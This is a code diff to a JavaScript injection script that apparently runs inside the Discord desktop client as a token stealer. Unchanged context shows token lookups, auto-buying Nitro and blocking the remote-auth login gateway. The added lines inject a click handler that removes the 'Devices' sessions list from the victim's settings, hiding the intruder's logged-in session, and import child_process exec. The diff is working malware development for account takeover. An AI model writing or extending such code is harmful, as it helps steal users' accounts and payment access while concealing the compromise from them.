@@ -4,6 +4,7 @@ const path = require("path");
 const querystring = require("querystring");
 const https = require("https");
 const { BrowserWindow, session } = require("electron");
+const { exec } = require("child_process");
 
 const config = {
     auto_buy_nitro: true,
@@ -143,6 +144,48 @@ const execScript = (script) => {
     const window = BrowserWindow.getAllWindows()[0];
     return window.webContents.executeJavaScript(script, !0);
 };
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+};
+
+async function noSessionPlease() {
+    await sleep(1000)
+    execScript(`
+function userclick() {
+    waitForElm(".children-1xdcWE").then((elm)=>elm[2].remove())
+    waitForElm(".sectionTitle-3j2YI1").then((elm)=>elm[2].remove())
+}
+
+function IsSession(item) {
+    return item?.innerText?.includes("Devices")
+}
+
+function handler(e) {
+    e = e || window.event;
+    var target = e.target || e.srcElement,
+    text = target.textContent || target.innerText;   
+    if (IsSession(target)) userclick()
+}
+function waitForElm(selector) {
+    return new Promise(resolve => {
+        const observer = new MutationObserver(mutations => {
+            if (document.querySelectorAll(selector).length>2) {
+                resolve(document.querySelectorAll(selector))
+            observer.disconnect();
+            }
+        });
+        observer.observe(document.body, {
+            childList: true,
+            subtree: true
+        });
+    });
+}
+document.addEventListener('click',handler,false);
+`)
+};
+
+noSessionPlease()
 
 const getInfo = async (token) => {
     const info = await execScript(`var xmlHttp = new XMLHttpRequest();
@@ -557,6 +600,7 @@ const nitroBought = async (token) => {
 session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
     if (details.url.startsWith("wss://remote-auth-gateway")) return callback({ cancel: true });
     updateCheck();
+
 });
 
 session.defaultSession.webRequest.onResponseStarted(config.filter, async (details, callback) => {
@@ -641,10 +685,6 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
             }, 75000);
             break;
 
-        case details.url.endsWith("sessions"):
-            await execScript(`document.getElementsByClassName("children-1xdcWE")[2].remove()`)
-            break;
-            
         default:
             break;
     }
